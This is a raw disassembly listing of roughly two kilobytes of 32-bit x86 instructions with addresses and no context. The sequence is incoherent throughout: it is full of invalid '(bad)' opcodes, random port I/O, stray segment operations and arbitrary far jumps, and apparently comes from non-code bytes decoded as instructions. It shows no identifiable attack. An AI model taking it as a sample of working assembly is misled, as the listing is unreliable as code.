  488e6b:	mov    WORD PTR [ebp+0x462fa9bd],fs
  488e71:	in     al,dx
  488e72:	inc    ecx
  488e73:	out    0x2f,eax
  488e75:	loopne 0x488e64
  488e77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  488e78:	add    DWORD PTR [ebx+0x73499741],ebp
  488e7e:	test   BYTE PTR [edx+edx*1],0xdb
  488e82:	nop
  488e83:	pop    ss
  488e84:	lahf   
  488e85:	pop    ds
  488e86:	lea    edx,[esi+0x7071c769]
  488e8c:	inc    esp
  488e8d:	cmc    
  488e8e:	cwde   
  488e8f:	jo     0x488e93
  488e91:	call   0x529b60b1
  488e96:	and    DWORD PTR [edx-0x5886f1ab],esp
  488e9c:	fist   WORD PTR [ecx+edx*1-0x472c9ca6]
  488ea3:	mov    edx,0xb11003f7
  488ea8:	push   es
  488ea9:	mov    esp,0xeb5b1ea
  488eae:	int    0xb0
  488eb0:	shr    BYTE PTR [esi+esi*8-0x4e0938e4],1
  488eb7:	mov    edi,0xa11b01b2
  488ebc:	mov    DWORD PTR [esi-0x56],edx
  488ebf:	call   0x7c8d:0xfc9d0d6a
  488ec6:	xor    BYTE PTR [ecx-0x28],bh
  488ec9:	jno    0x488ef6
  488ecb:	push   edi
  488ecc:	sub    al,0x5f
  488ece:	push   esp
  488ecf:	lods   eax,DWORD PTR ds:[esi]
  488ed0:	ins    DWORD PTR es:[edi],dx
  488ed1:	loop   0x488f2d
  488ed3:	stc    
  488ed4:	dec    edx
  488ed5:	xor    ch,ah
  488ed7:	iret   
  488ed8:	xor    ebx,DWORD PTR [eax+ebp*1]
  488edb:	or     al,0xeb
  488edd:	cmp    ebp,DWORD PTR [edx+0x1]
  488ee0:	adc    eax,0x5230ac30
  488ee5:	sbb    esi,DWORD PTR [edi+0x36]
  488ee8:	loopne 0x488ede
  488eea:	sbb    DWORD PTR [ebx+esi*1+0x395eea6c],esp
  488ef1:	jmp    0xc2c690c
  488ef6:	ret    0x4dd6
  488ef9:	mov    ecx,DWORD PTR [eax]
  488efb:	and    DWORD PTR [edx+0x257e0d1],edx
  488f01:	pop    edi
  488f02:	xlat   BYTE PTR ds:[ebx]
  488f03:	sub    dl,dh
  488f05:	loopne 0x488f0c
  488f07:	cmp    eax,0x1ce00874
  488f0c:	mov    eax,edx
  488f0e:	xor    edx,DWORD PTR [edx+ecx*1+0x3d]
  488f12:	xchg   ecx,eax
  488f13:	pop    ss
  488f14:	leave  
  488f15:	outs   dx,DWORD PTR ds:[esi]
  488f16:	adc    DWORD PTR [esi-0x80],eax
  488f19:	pop    es
  488f1a:	sub    DWORD PTR [eax+0x73],esi
  488f1d:	(bad)  [ebp+0x15a4c6c3]
  488f23:	pop    ss
  488f24:	mov    eax,ds:0x210d21f4
  488f29:	test   al,0xf
  488f2b:	mov    ax,ds:0xb89b8ab2
  488f31:	or     BYTE PTR [edx+edx*8-0x64],0x2b
  488f36:	xor    esp,DWORD PTR [eax+esi*4+0x688f10b4]
  488f3d:	or     BYTE PTR [ecx],cl
  488f3f:	or     ebx,DWORD PTR [ebp+0x54]
  488f42:	test   al,0x72
  488f44:	adc    al,BYTE PTR [esi+0x2c]
  488f47:	mov    edi,0x58859f8d
  488f4c:	scas   eax,DWORD PTR es:[edi]
  488f4d:	shl    eax,cl
  488f4f:	ret    
  488f50:	leave  
  488f51:	and    BYTE PTR [ecx-0x20],dl
  488f54:	add    bl,BYTE PTR [edx+0x28]
  488f57:	sbb    ebp,esp
  488f59:	pop    es
  488f5a:	fmul   QWORD PTR gs:[ebx]
  488f5d:	jp     0x488f17
  488f5f:	hlt    
  488f60:	sub    ebp,DWORD PTR ds:[ebx]
  488f63:	add    al,0x74
  488f65:	ins    BYTE PTR es:[edi],dx
  488f66:	mov    edi,0x8301b9f8
  488f6b:	arpl   WORD PTR [eax+0x13],dx
  488f6e:	or     ebx,DWORD PTR [edx]
  488f70:	lahf   
  488f71:	and    al,0xbc
  488f73:	repnz or DWORD PTR [ebp-0x70],eax
  488f77:	inc    esi
  488f78:	out    0x40,eax
  488f7a:	add    ebx,DWORD PTR [ebx+0x613a5ee8]
  488f80:	loope  0x488fd1
  488f82:	jo     0x488f64
  488f84:	or     ah,al
  488f86:	inc    ebx
  488f87:	jb     0x488f51
  488f89:	(bad)  
  488f8a:	mov    eax,ds:0xb8b8b8f0
  488f8f:	mov    dl,0x3f
  488f91:	sbb    DWORD PTR [edx+0x3b],0x2b
  488f95:	push   edi
  488f96:	mov    esp,0x2144878a
  488f9b:	add    al,BYTE PTR [edi-0x2f789ac5]
  488fa1:	xor    DWORD PTR [eax+ebp*2-0x50],0x2b62d9d4
  488fa9:	jecxz  0x48900c
  488fab:	lods   al,BYTE PTR ds:[esi]
  488fac:	nop
  488fad:	jno    0x488f80
  488faf:	jo     0x489022
  488fb1:	mov    edi,0x481e3a1d
  488fb6:	add    al,0xcd
  488fb8:	(bad)  
  488fb9:	adc    eax,0x2b0289c3
  488fbe:	dec    eax
  488fbf:	jb     0x488f6e
  488fc1:	push   eax
  488fc2:	ss das 
  488fc4:	fisttp WORD PTR [esp+esi*1]
  488fc7:	jb     0x489008
  488fc9:	and    BYTE PTR [ebp+0x2a349fed],bh
  488fcf:	sti    
  488fd0:	aam    0xb9
  488fd2:	dec    eax
  488fd3:	fst    QWORD PTR [eax-0x5ef7a746]
  488fd9:	mov    al,0x85
  488fdb:	or     BYTE PTR [esi+ebx*4-0x6e39701],cl
  488fe2:	call   0xc424:0xc16c630d
  488fe9:	inc    ebx
  488fea:	sub    BYTE PTR [eax-0x8ffcbeb],al
  488ff0:	xor    BYTE PTR [eax-0x7a],dl
  488ff3:	jb     0x488fdc
  488ff5:	ret    
  488ff6:	iret   
  488ff7:	aam    0x10
  488ff9:	leave  
  488ffa:	or     bl,bh
  488ffc:	or     ch,BYTE PTR [esi+0x67128541]
  489002:	pop    es
  489003:	mov    ebp,0x27e9d28a
  489008:	adc    al,bl
  48900a:	data16 jae 0x489047
  48900d:	pop    ebp
  48900e:	stos   DWORD PTR es:[edi],eax
  48900f:	inc    ecx
  489010:	aas    
  489011:	ja     0x489054
  489013:	outs   dx,BYTE PTR ds:[esi]
  489014:	pop    ebx
  489015:	gs xchg ah,ah
  489018:	pop    edx
  489019:	mov    ds:0xf9062e5b,al
  48901e:	xor    eax,0xc493c7a5
  489023:	inc    ebx
  489024:	lods   al,BYTE PTR ds:[esi]
  489025:	pop    edx
  489026:	add    BYTE PTR [edx],cl
  489028:	jg     0x489062
  48902a:	mov    eax,0x909b8ae8
  48902f:	dec    edx
  489030:	push   ecx
  489031:	jg     0x4890a1
  489033:	fdivr  QWORD PTR [eax+0x16246a54]
  489039:	inc    esp
  48903a:	cmp    dl,dl
  48903c:	xor    DWORD PTR [edi+0x67],edi
  48903f:	inc    edi
  489040:	repnz push eax
  489042:	ror    DWORD PTR [edi+0x2243c49a],0x55
  489049:	xchg   BYTE PTR [edx-0x58bc3a2e],bl
  48904f:	lods   al,BYTE PTR ds:[esi]
  489050:	pop    esi
  489051:	pop    ds
  489052:	fs mov ch,0x0
  489055:	sub    dl,BYTE PTR [ebp+0x68]
  489058:	setae  BYTE PTR ds:0xea0cc5a8
  48905f:	adc    al,0x19
  489061:	mov    dl,0x64
  489063:	dec    edi
  489064:	or     DWORD PTR [ecx-0xe],edi
  489067:	cmp    eax,0x1f43d83c
  48906c:	add    BYTE PTR [eax*8-0x367dc380],ch
  489073:	push   eax
  489074:	(bad)  
  489075:	sbb    eax,0x7da6c529
  48907a:	ret    
  48907b:	out    dx,al
  48907c:	nop
  48907d:	js     0x48909b
  48907f:	add    eax,eax
  489081:	push   ss
  489082:	add    al,0xc6
  489084:	pop    ds
  489085:	shl    BYTE PTR [esi],cl
  489087:	add    ah,0x7b
  48908a:	in     al,dx
  48908b:	push   es
  48908c:	pusha  
  48908d:	push   es
  48908e:	sub    BYTE PTR [esi+ebx*1],ch
  489091:	inc    eax
  489092:	ds dec eax
  489094:	and    dl,cl
  489096:	inc    ebx
  489097:	nop
  489098:	retf   0x8c43
  48909b:	inc    ecx
  48909c:	add    eax,0x7491e42
  4890a1:	or     DWORD PTR [eax-0x49],0xa431af58
  4890a8:	cmp    edx,DWORD PTR [edi-0x24100008]
  4890ae:	pusha  
  4890af:	mov    WORD PTR ds:[edx],ss
  4890b2:	rcl    bl,cl
  4890b4:	jl     0x4890bc
  4890b6:	jo     0x489082
  4890b8:	adc    BYTE PTR [eax],0x20
  4890bb:	loope  0x4890de
  4890bd:	leave  
  4890be:	jge    0x489089
  4890c0:	xor    dl,bl
  4890c2:	or     DWORD PTR [ebp+0x31078757],0x2d
  4890c9:	imul   ecx,DWORD PTR [ebx+ebp*2-0x2e],0x4227b0ce
  4890d1:	out    dx,eax
  4890d2:	mov    fs,WORD PTR [eax]
  4890d4:	outs   dx,BYTE PTR ds:[esi]
  4890d5:	int3   
  4890d6:	add    ecx,eax
  4890d8:	push   ecx
  4890d9:	inc    edx
  4890da:	cmp    ch,bh
  4890dc:	dec    DWORD PTR [esp+eiz*4]
  4890df:	ins    BYTE PTR es:[edi],dx
  4890e0:	mov    edi,0xe3e24509
  4890e5:	or     BYTE PTR [ebx+0x3c],al
  4890e8:	addr16 jb 0x48908f
  4890eb:	xor    eax,0x276e2428
  4890f0:	jmp    0x1fc7:0xb3ad69bd
  4890f7:	aam    0x36
  4890f9:	out    dx,al
  4890fa:	push   es
  4890fb:	push   0x48d53d45
  489100:	imul   DWORD PTR [eax+0x421b43cc]
  489106:	push   ds
  489107:	mov    bl,bh
  489109:	int3   
  48910a:	int    0x43
  48910c:	cmp    al,0x5e
  48910e:	and    BYTE PTR ds:0xce50e0dc,dh
  489114:	fiadd  WORD PTR [esi+0x2]
  489117:	std    
  489118:	scas   eax,DWORD PTR es:[edi]
  489119:	sbb    ah,BYTE PTR [edx+ecx*1]
  48911c:	repz retfw 0x2af8
  489121:	inc    eax
  489122:	mov    eax,ds:0x227da7a1
  489127:	inc    esp
  489128:	iret   
  489129:	push   es
  48912a:	adc    DWORD PTR fs:[ecx],ebx
  48912d:	(bad)  
  48912e:	loopne 0x489110
  489130:	and    bl,cl
  489132:	lods   eax,DWORD PTR ds:[esi]
  489133:	aas    
  489134:	pop    es
  489135:	sub    eax,0xa418904f
  48913a:	mov    WORD PTR [ecx+0x13],fs
  48913d:	rcl    DWORD PTR [esi+0x78dc0186],0xc7
  489144:	mov    bh,0x24
  489146:	and    BYTE PTR [ecx+0x1fc8b133],cl
  48914c:	adc    al,cl
  48914e:	inc    edi
  48914f:	test   BYTE PTR [esi+esi*8],bh
  489152:	xor    BYTE PTR [edx],ah
  489154:	hlt    
  489155:	(bad)  
  489156:	inc    ebx
  489157:	push   esp
  489158:	xor    DWORD PTR es:[eax+0xd],edx
  48915c:	and    eax,0x2848f06b
  489161:	mov    bh,0xc7
  489163:	pop    es
  489164:	sub    DWORD PTR [eax-0x48],esp
  489167:	sbb    eax,0x23200d12
  48916c:	in     al,0x37
  48916e:	fwait
  48916f:	test   BYTE PTR [ebp+0x72],0x94
  489173:	enter  0x16e8,0x2c
  489177:	leave  
  489178:	pop    ds
  489179:	or     dl,BYTE PTR [esi]
  48917b:	and    BYTE PTR [edi],ch
  48917d:	inc    esp
  48917e:	fstp   QWORD PTR [eax]
  489180:	push   es
  489181:	push   esi
  489182:	sub    al,0xc5
  489184:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  489185:	push   ebp
  489186:	repnz inc ecx
  489188:	jl     0x48915a
  48918a:	inc    ebx
  48918b:	dec    edi
  48918c:	jae    0x489161
  48918e:	in     eax,dx
  48918f:	in     al,0x3
  489191:	vmread DWORD PTR fs:[edi+0x7c],ebp
  489196:	shl    ecx,0xde
  489199:	repz add al,BYTE PTR [eax]
  48919c:	out    dx,al
  48919d:	cmp    BYTE PTR [esi+0x60],dl
  4891a0:	push   es
  4891a1:	or     eax,0xcec48325
  4891a6:	xchg   BYTE PTR [esi],cl
  4891a8:	sub    al,0xc9
  4891aa:	sub    ebp,esp
  4891ac:	or     al,0x6
  4891ae:	xchg   BYTE PTR [edi-0x63f0fcb2],cl
  4891b4:	out    dx,al
  4891b5:	stc    
  4891b6:	inc    eax
  4891b7:	test   DWORD PTR [eax+0x4f],ecx
  4891ba:	retf   0x43
  4891bd:	sbb    BYTE PTR [ebx],bh
  4891bf:	sbb    ch,BYTE PTR [edx]
  4891c1:	mov    ecx,0x84412ba8
  4891c6:	mov    ds:0xf3ce0698,al
  4891cb:	cmp    al,0xcf
  4891cd:	lods   al,BYTE PTR ds:[esi]
  4891ce:	rcl    ah,0xe8
  4891d1:	cld    
  4891d2:	jns    0x4891b2
  4891d4:	aad    0x90
  4891d6:	scas   eax,DWORD PTR es:[edi]
  4891d7:	cmp    BYTE PTR [esi],al
  4891d9:	dec    esp
  4891da:	push   eax
  4891db:	out    0x79,eax
  4891dd:	sahf   
  4891de:	out    0x54,eax
  4891e0:	pop    eax
  4891e1:	pop    esp
  4891e2:	pusha  
  4891e3:	fs lahf 
  4891e5:	out    0x79,eax
  4891e7:	sahf   
  4891e8:	push   0x7874706c
  4891ed:	or     edx,DWORD PTR [eax+eiz*1+0x34]
  4891f1:	push   0x48
  4891f3:	xchg   ebx,eax
  4891f4:	ret    
  4891f5:	add    DWORD PTR [edx-0x20],esp
  4891f8:	scas   eax,DWORD PTR es:[edi]
  4891f9:	pop    esp
  4891fa:	sub    eax,0x31f212be
  4891ff:	dec    ebx
  489200:	pop    edi
  489201:	add    DWORD PTR [ebp-0x637d7c18],edx
  489207:	shl    BYTE PTR ss:[edi+0x2ddd6965],0x52
  48920f:	xor    BYTE PTR [edx+0x8c89a05],dl
  489215:	jnp    0x48919f
  489217:	ds mov al,0x1
  48921a:	aaa    
  48921b:	pop    ebp
  48921c:	sbb    dh,ah
  48921e:	jnp    0x4891e8
  489220:	xor    al,0x90
  489222:	mov    esp,0x318d03e2
  489227:	inc    eax
  489228:	fnsave [edx]
  48922a:	sbb    eax,0x494f578c
  48922f:	arpl   WORD PTR ds:0xc650e79b,sp
  489235:	inc    ebx
  489236:	adc    al,dh
  489238:	pusha  
  489239:	and    BYTE PTR [esi],al
  48923b:	mov    ebx,0xdf852234
  489240:	mov    al,ds:0x50ba294f
  489245:	leave  
  489246:	setb   BYTE PTR [edi+0x7a8b5ceb]
  48924d:	xor    BYTE PTR [ebx+ecx*4+0x40],bl
  489251:	xor    BYTE PTR [ecx-0x80],dh
  489254:	ss push 0xc681f657
  48925a:	out    0xb2,eax
  48925c:	inc    ecx
  48925d:	push   ss
  48925e:	lea    eax,[ebx+0x58]
  489261:	and    edx,eax
  489263:	pop    ecx
  489264:	xchg   edi,eax
  489265:	dec    edi
  489266:	pop    esi
  489267:	jno    0x48924f
  489269:	sub    cl,BYTE PTR [eax-0x1f]
  48926c:	mov    dl,0xa7
  48926e:	pop    esp
  48926f:	inc    ecx
  489270:	or     cl,bl
  489272:	xchg   DWORD PTR [eax],ebx
  489274:	sub    eax,0xcc340dd3
  489279:	inc    edi
  48927a:	mov    eax,ds:0xff10be03
  48927f:	cwde   
  489280:	pop    esp
  489281:	add    al,0x37
  489283:	sbb    dh,BYTE PTR [edx+0xe9ad691]
  489289:	push   edx
  48928a:	sub    DWORD PTR [edi-0x6aeea3ce],ecx
  489290:	add    BYTE PTR [edi],0x24
  489293:	dec    ebx
  489294:	repz sub ebx,esi
  489297:	pop    ebp
  489298:	cs or  al,0x32
  48929b:	push   ecx
  48929c:	int    0x5
  48929e:	or     DWORD PTR [edx+eiz*1+0x20],esi
  4892a2:	lahf   
  4892a3:	fs je  0x4892c5
  4892a6:	inc    ebx
  4892a7:	xchg   esi,eax
  4892a8:	adc    eax,0x40b89e15
  4892ad:	fs jecxz 0x4892da
  4892b0:	add    DWORD PTR [edi+0x48],ebx
  4892b3:	add    eax,0xb956c072
  4892b8:	scas   eax,DWORD PTR es:[edi]
  4892b9:	lock test BYTE PTR [edx+esi*1],bl
  4892bd:	leave  
  4892be:	pushf  
  4892bf:	nop
  4892c0:	aas    
  4892c1:	popa   
  4892c2:	push   ecx
  4892c3:	and    ebp,DWORD PTR fs:[edi+0x4c383bf2]
  4892ca:	mov    bh,0x30
  4892cc:	sbb    al,0xc0
  4892ce:	xlat   BYTE PTR ds:[ebx]
  4892cf:	inc    ebx
  4892d0:	loopne 0x489344
  4892d2:	and    esp,DWORD PTR fs:[esi+0x150dc034]
  4892d9:	fst    DWORD PTR [eax+0x3e]
  4892dc:	inc    esi
  4892dd:	add    BYTE PTR [eax+0x11506148],cl
  4892e3:	ja     0x48926d
  4892e5:	dec    ebx
  4892e6:	pop    ecx
  4892e7:	sbb    BYTE PTR [edi+0x4b],al
  4892ea:	or     ah,BYTE PTR [edi]
  4892ec:	sub    DWORD PTR [esi+0x3077c682],edx
  4892f2:	sbb    ecx,DWORD PTR [ebx+0x6b]
  4892f5:	inc    esp
  4892f6:	dec    ebx
  4892f7:	jmp    0x489335
  4892f9:	xor    BYTE PTR [ebp+0x5b],bh
  4892fc:	or     DWORD PTR [esi],ecx
  4892fe:	adc    eax,0x508f04df
  489303:	ins    BYTE PTR es:[edi],dx
  489304:	out    0x1b,eax
  489306:	and    bh,BYTE PTR [esi]
  489308:	in     eax,0xa7
  48930a:	mov    eax,ds:0x4c402123
  48930f:	(bad)
  489312:	(bad)  
  489313:	jmp    0x2b0956f8
  489318:	or     al,0x5f
  48931a:	lds    ebx,FWORD PTR ds:0x30cf8e32
  489320:	(bad)  
  489321:	adc    al,0xd5
  489323:	sbb    eax,0xbf82f8c0
  489328:	push   0x25bb60d7
  48932d:	sbb    BYTE PTR [ecx],dh
  48932f:	fistp  WORD PTR [ecx-0x3e]
  489332:	je     0x4893b0
  489334:	out    dx,al
  489335:	mov    WORD PTR [edi],fs
  489337:	ror    DWORD PTR [eax],cl
  489339:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48933a:	cmp    BYTE PTR [edi],al
  48933c:	sub    DWORD PTR [edi+eax*8-0x2a95cbcb],edi
  489343:	cmp    dl,al
  489345:	adc    eax,0x1221be4c
  48934a:	or     bl,dl
  48934c:	inc    edx
  48934d:	and    eax,0x4f9070fa
  489352:	cmp    edx,DWORD PTR [eax+0x38]
  489355:	jne    0x489382
  489357:	jl     0x4892db
  489359:	rol    dh,0x7e
  48935c:	das    
  48935d:	sub    bh,BYTE PTR [ebx]
  48935f:	jle    0x489399
  489361:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  489362:	dec    edi
  489363:	push   ss
  489364:	mov    al,0xd
  489366:	sbb    ah,BYTE PTR [ebx+0x64251e0a]
  48936c:	sub    al,0xc5
  48936e:	arpl   WORD PTR [eax],si
  489370:	inc    edi
  489371:	sbb    DWORD PTR [edi-0x5a],ebx
  489374:	mov    al,0x14
  489376:	pop    esp
  489377:	or     al,0x2e
  489379:	mov    dh,0x4a
  48937b:	jmp    0xd729c5bf
  489380:	xchg   DWORD PTR [ebx+0x16],esi
  489383:	inc    ebp
  489384:	cmp    edi,edx
  489386:	dec    eax
  489387:	loope  0x48938d
  489389:	push   0xffffff8c
  48938b:	inc    edx
  48938c:	or     al,0x68
  48938e:	dec    esp
  48938f:	inc    eax
  489390:	loope  0x48933e
  489392:	mov    bl,0x4e
  489394:	sub    eax,0xcc1c2815
  489399:	lock inc ebx
  48939b:	scas   eax,DWORD PTR es:[edi]
  48939c:	mov    eax,0x1bd026b
  4893a1:	or     al,0xe2
  4893a3:	jnp    0x4893cd
  4893a5:	pop    ds
  4893a6:	mov    ch,0x76
  4893a8:	push   eax
  4893a9:	mov    gs,WORD PTR [ebx-0x60]
  4893ac:	popa   
  4893ad:	mov    ecx,0xeebe8314
  4893b2:	push   ebx
  4893b3:	sub    edx,DWORD PTR [ebx]
  4893b5:	add    al,0x86
  4893b7:	xchg   BYTE PTR [ecx],dl
  4893b9:	push   ss
  4893ba:	adc    dl,BYTE PTR [ecx]
  4893bc:	jo     0x489421
  4893be:	out    0x3b,eax
  4893c0:	xor    BYTE PTR es:0xece7460f,cl
  4893c7:	mov    al,0xf0
  4893c9:	retf   0xfcad
  4893cc:	or     eax,0x127440ee
  4893d1:	push   0x5ec26600
  4893d6:	ins    DWORD PTR es:[edi],dx
  4893d7:	addr16 cwde 
  4893d9:	xor    DWORD PTR [ebx+0x302150f9],ebx
  4893df:	pop    ecx
  4893e0:	es jecxz 0x4893e1
  4893e3:	sbb    al,0x76
  4893e5:	out    0xf3,eax
  4893e7:	xchg   esi,eax
  4893e8:	xor    bh,BYTE PTR [esi+0x2c]
  4893eb:	cmp    bp,WORD PTR [ebx-0x447ce535]
  4893f2:	nop
  4893f3:	loope  0x4893ec
  4893f5:	cmp    eax,DWORD PTR [ecx]
  4893f7:	popf   
  4893f8:	(bad)  
  4893f9:	mov    esp,0xc70cd58b
  4893fe:	sbb    al,0x40
  489400:	cdq    
  489401:	clc    
  489402:	sbb    eax,eax
  489404:	push   eax
  489405:	fucomp st(3)
  489407:	push   es
  489408:	adc    dh,al
  48940a:	push   eax
  48940b:	pop    bp
  48940d:	adc    edi,DWORD PTR [edi-0x6f]
  489410:	fisub  DWORD PTR [ecx]
  489412:	aaa    
  489413:	imul   ecx,esp,0x40615b8b
  489419:	xchg   edi,eax
  48941a:	fmul   DWORD PTR [edx+0x34923f87]
  489420:	xchg   DWORD PTR [edx+edx*2],ebx
  489423:	push   esp
  489424:	push   eax
  489425:	cmp    ecx,DWORD PTR [esp+eax*8+0x36]
  489429:	ret    
  48942a:	enter  0x27c6,0xf6
  48942e:	nop
  48942f:	add    dl,BYTE PTR [esi+eiz*2]
  489432:	pop    es
  489433:	mov    BYTE PTR [edx+0x405f2054],bl
  489439:	bound  edx,QWORD PTR [ebp-0x195b6a8c]
  48943f:	add    edi,eax
  489441:	add    DWORD PTR [ebp+0x24],esi
  489444:	bound  ebx,QWORD PTR [eax+0x5ad5df5f]
  48944a:	popa   
  48944b:	mov    ds:0x45579901,eax
  489450:	mov    dh,0x92
  489452:	push   esi
  489453:	pop    edi
  489454:	cwde   
  489455:	add    BYTE PTR [edi-0x27],dh
  489458:	adc    DWORD PTR [esp+edx*1+0x90a49c],esp
  48945f:	lea    edx,[edi-0x7bfbdf07]
  489465:	push   ecx
  489466:	add    edi,DWORD PTR [edx+0xd56241c]
  48946c:	sub    eax,0x4cc36677
  489471:	adc    al,0x91
  489473:	cmp    DWORD PTR [esp+edi*8-0x743ba57a],0xfffffffe
  48947b:	adc    ebp,DWORD PTR [ecx+0x13]
  48947e:	ret    0xb428
  489481:	scas   al,BYTE PTR es:[edi]
  489482:	push   ss
  489483:	shr    DWORD PTR [edx+0x7d],1
  489486:	push   ebx
  489487:	and    bh,BYTE PTR [esi+0x23f2a194]
  48948d:	push   ebx
  48948e:	jl     0x4894d8
  489490:	jnp    0x48945b
  489492:	(bad)  
  489493:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  489494:	les    ebp,FWORD PTR [eax-0x38]
  489497:	data16 sbb al,BYTE PTR [ebp+edx*8-0x3ac1f3de]
  48949f:	and    al,0x8a
  4894a1:	xchg   ebx,eax
  4894a2:	retf   
  4894a3:	lahf   
  4894a4:	inc    esp
  4894a5:	push   0x11
  4894a7:	in     eax,dx
  4894a8:	jae    0x4894ee
  4894aa:	add    al,0x40
  4894ac:	xchg   ebx,eax
  4894ad:	imul   ebx,DWORD PTR [edx+0x47e6d8f6],0x4c4c0a48
  4894b7:	cmp    ch,dl
  4894b9:	and    bl,BYTE PTR [edx+0x3c3c38a6]
  4894bf:	ret    
  4894c0:	pop    eax
  4894c1:	dec    eax
  4894c2:	inc    ecx
  4894c3:	and    BYTE PTR [edi],ah
  4894c5:	adc    DWORD PTR [esi],eax
  4894c7:	mov    ds:0x36cad347,eax
  4894cc:	xchg   DWORD PTR [ecx-0x153dbe57],edi
  4894d2:	push   eax
  4894d3:	sti    
  4894d4:	daa    
  4894d5:	dec    ebp
  4894d6:	push   ss
  4894d7:	and    BYTE PTR [edx+0x50],dh
  4894da:	ds push eax
  4894dc:	leave  
  4894dd:	sti    
  4894de:	rol    ecx,1
  4894e0:	jge    0x4894bf
  4894e2:	outs   dx,BYTE PTR ds:[esi]
  4894e3:	push   edx
  4894e4:	dec    esp
  4894e5:	scas   al,BYTE PTR es:[edi]
  4894e6:	fmul   QWORD PTR [ebp+0x521c6443]
  4894ec:	jp     0x489562
  4894ee:	test   ch,ch
  4894f0:	fbstp  TBYTE PTR [eax]
  4894f2:	mov    ah,0x56
  4894f4:	ins    DWORD PTR es:[edi],dx
  4894f5:	jmp    0xf566:0x882577bf
  4894fc:	shr    DWORD PTR [eax-0x12],cl
  4894ff:	out    0x65,al
  489501:	dec    ecx
  489502:	ds dec edx
  489504:	js     0x48956e
  489506:	add    DWORD PTR [esp],edx
  489509:	rol    DWORD PTR [ebx],cl
  48950b:	cs inc ebp
  48950d:	jecxz  0x489549
  48950f:	pop    eax
  489510:	imul   edx,DWORD PTR [ecx],0x9cc409d
  489516:	mov    al,ds:0x2c295b50
  48951b:	cdq    
  48951c:	pusha  
  48951d:	xchg   edi,eax
  48951e:	add    DWORD PTR [ebx],edx
  489520:	mov    al,0xef
  489522:	sub    al,BYTE PTR [ebx+0x58119127]
  489528:	dec    edi
  489529:	jne    0x489505
  48952b:	test   BYTE PTR [eax+0x33849f7c],cl
  489531:	or     al,BYTE PTR [edx+0x7e]
  489534:	pop    ebx
  489535:	out    0x69,eax
  489537:	jmp    0x749e863a
  48953c:	push   edx
  48953d:	jnp    0x48959b
  48953f:	dec    esi
  489540:	mov    ebp,0xa5f88b80
  489545:	inc    eax
  489546:	test   BYTE PTR [eax+0x3b5c0621],dh
  48954c:	mov    ebp,0xd542906c
  489551:	push   edi
  489552:	fdivr  st,st(4)
  489554:	je     0x48957b
  489556:	lds    esi,FWORD PTR [esi]
  489558:	cmp    al,BYTE PTR [eax-0x6933d18]
  48955e:	ins    BYTE PTR es:[edi],dx
  48955f:	sar    DWORD PTR [ecx+0x17],0xf
  489563:	jnp    0x4895c6
  489565:	rol    bl,cl
  489567:	shl    DWORD PTR [ebx],1
  489569:	xchg   DWORD PTR [ebx],edx
  48956b:	les    ebx,FWORD PTR [ebp-0x5b972cd5]
  489571:	add    ah,0x20
  489574:	pop    edi
  489575:	xlat   BYTE PTR ds:[ebx]
  489576:	pop    edi
  489577:	js     0x489513
  489579:	ins    DWORD PTR es:[edi],dx
  48957a:	sti    
  48957b:	push   0x74
  48957d:	pop    edi
  48957e:	cmp    DWORD PTR [edi+0x19f53b74],esi
  489584:	mov    dl,BYTE PTR [eax+0x58]
  489587:	loop   0x4895fe
  489589:	or     BYTE PTR [esp+edi*4],ch
  48958c:	sub    eax,DWORD PTR [ecx]
  48958e:	lahf   
  48958f:	(bad)  
  489590:	dec    eax
  489591:	push   ss
  489592:	add    al,0x1c
  489594:	retf   0x4c8
  489597:	adc    al,0x5
  489599:	mov    dl,BYTE PTR [ecx+eiz*1+0x20]
  48959d:	xor    BYTE PTR [ebp+eax*4-0x5],ah
  4895a1:	xor    edx,DWORD PTR [edx-0x2f]
  4895a4:	pop    esp
  4895a5:	pop    ss
  4895a6:	jmp    0x3e5:0x4d78bac5
  4895ad:	out    0x86,eax
  4895af:	lods   eax,DWORD PTR ds:[esi]
  4895b0:	xor    DWORD PTR [esi+0xbb5dd50],ebp
  4895b6:	ss mov bh,0xef
  4895b9:	adc    DWORD PTR [ecx],esi
  4895bb:	aad    0xc9
  4895bd:	pusha  
  4895be:	inc    eax
  4895bf:	popa   
  4895c0:	adc    eax,0xced2e807
  4895c5:	js     0x4895e1
  4895c7:	int    0x7f
  4895c9:	sbb    eax,0x8fafa49b
  4895ce:	cmp    eax,DWORD PTR [ebx+0x74]
  4895d1:	je     0x489612
  4895d3:	jns    0x48959f
  4895d5:	inc    ecx
  4895d6:	sbb    al,0x85
  4895d8:	pop    esp
  4895d9:	jb     0x489564
  4895db:	in     al,0x8a
  4895dd:	push   edx
  4895de:	cmp    DWORD PTR [edi+0x3f],0x6464037c
  4895e5:	sub    BYTE PTR [eax+0x7c],0x4
  4895e9:	cmp    ebx,DWORD PTR ds:0xcf836f04
  4895ef:	je     0x489633
  4895f1:	jne    0x48965b
  4895f3:	das    
  4895f4:	enter  0x6c41,0x79
  4895f8:	mov    bh,0x66
  4895fa:	add    BYTE PTR [eax],cl
  4895fc:	out    dx,eax
  4895fd:	mov    cx,0xbca5
  489601:	push   ebx
  489602:	enter  0x9524,0x84
  489606:	inc    ebp
  489607:	sub    BYTE PTR [ecx],cl
  489609:	(bad)
  48960c:	mov    bh,0x66
  48960e:	mov    edi,0x897fdb70
  489613:	mov    edi,0x5622c7af
  489618:	les    edi,FWORD PTR [edx]
  48961a:	popf   
  48961b:	adc    DWORD PTR [edx],ebx
  48961d:	mov    dh,BYTE PTR [ebx]
  48961f:	add    eax,0x3230b708
  489624:	lds    ebp,FWORD PTR [edx+0x3a]
  489627:	mov    edi,0xe545b55f
  48962c:	frstor [edi-0x2c8b2c8e]
  489632:	mov    BYTE PTR [esi+edi*4-0x78f9493b],al
  489639:	adc    edi,0xb57385a5
  48963f:	mov    ch,0x56
  489641:	cmp    esi,DWORD PTR [ebp+0xd]
  489644:	dec    ebx
  489645:	xor    DWORD PTR [ebx],eax
  489647:	sbb    ah,bl
  489649:	or     al,BYTE PTR [eax+0x1f]
  48964c:	jge    0x4895f4
  48964e:	icebp  
  48964f:	test   DWORD PTR ds:0x60bb12bf,ebx
  489655:	sub    BYTE PTR [eax+0x4931505c],ch
  48965b:	mov    al,ds:0xd6008221
  489660:	out    0x1,eax
  489662:	js     0x4895e8
  489664:	dec    eax
  489665:	add    eax,0x83ac8a78
